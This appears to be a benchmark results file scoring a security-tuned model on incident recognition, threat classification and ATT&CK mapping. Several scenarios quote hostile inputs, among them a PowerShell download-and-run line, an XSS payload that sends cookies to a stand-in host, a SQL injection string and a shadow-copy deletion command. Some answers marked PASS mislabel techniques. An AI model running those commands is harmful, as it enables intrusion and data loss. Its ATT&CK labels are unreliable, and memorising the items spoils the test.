# Foundation-Sec-8B-Instruct evaluation
Model: `hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M`
Run started: 2026-05-06 00:32:51

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 4 | 7 | 57% |
| Threat classification | 7 | 7 | 100% |
| MITRE ATT&CK mapping | 7 | 10 | 70% |
| **Overall** | **18** | **24** | **75%** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — FAIL (3.5s)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Incident.

### INC-2 — expected: **incident** — PASS (0.5s)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident.

### INC-3 — expected: **incident** — PASS (0.4s)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident.

### INC-4 — expected: **benign** — FAIL (0.6s)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Incident
This is an anomaly in the system's behavior that requires further investigation to determine if it is malicious or not.

### INC-5 — expected: **incident** — PASS (0.6s)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident. This is an attempt to download and execute malicious code from an external source, which could indicate a potential compromise.

### INC-6 — expected: **benign** — FAIL (0.4s)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Incident.

### INC-7 — expected: **incident** — PASS (0.5s)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Incident.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (0.6s)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: Ransomware - Files encrypted by a malicious program that demands payment to restore access.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.5s)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: Phishing - An attempt to steal sensitive information by posing as a trusted source.

_Match_: 'phishing'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.8s)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: SQL Injection. This is an attempt to exploit a vulnerability in the application's database by injecting malicious SQL code into the input fields. In this case, the attacker is attempting to bypass authentication by exploiting the OR condition in the WHERE clause of the SELECT statement.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.6s)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: Cross-Site Scripting (XSS) - An attacker injects malicious JavaScript code into a web application's response to steal sensitive information like cookies.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.7s)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: The specific threat or attack type is "Credential Dumping" which involves extracting sensitive information such as usernames and passwords from the Local Security Authority Subsystem Service (LSASS) process memory.

_Match_: 'credential'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.9s)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: DDoS (Distributed Denial-of-Service) Attack: A DDoS attack floods a server with excessive traffic to overwhelm it and make it unavailable to legitimate users. In this case, multiple hosts on the corporate network are sending UDP traffic to the company's public DNS, which is being spoofed by attackers.

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (0.6s)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Supply Chain Attack - A malicious actor infiltrated the vendor's build server and inserted malware into their software updates, which were then distributed to customers' machines.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — PASS (0.4s)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: T1204.002 - User Execution: Malicious File

_Detected IDs_: T1204.002

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.5s)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1003.001 - OS Credential Dumping: LSASS Memory

_Detected IDs_: T1003.001

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.6s)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (0.5s)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: T1087 - Command and Scripting Interpreter

_Detected IDs_: T1087

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — PASS (0.6s)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — PASS (0.9s)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1071.004 - Application Layer Protocol: DNS

Explanation: The scenario describes a C2 beaconing traffic that is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy. This behavior matches with the MITRE ATT&CK technique T1071.004 - Application Layer Protocol: DNS.

_Detected IDs_: T1071.004

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.6s)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.5s)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1070.002 - Indicator Removal on Host: File Deletion

_Detected IDs_: T1070.002

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — PASS (0.5s)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: T1059.001 - Command and Scripting Interpreter: PowerShell

_Detected IDs_: T1059.001

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — PASS (0.6s)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: T1560.002 - Archive Collected Data: Archive via Custom Method

_Detected IDs_: T1560
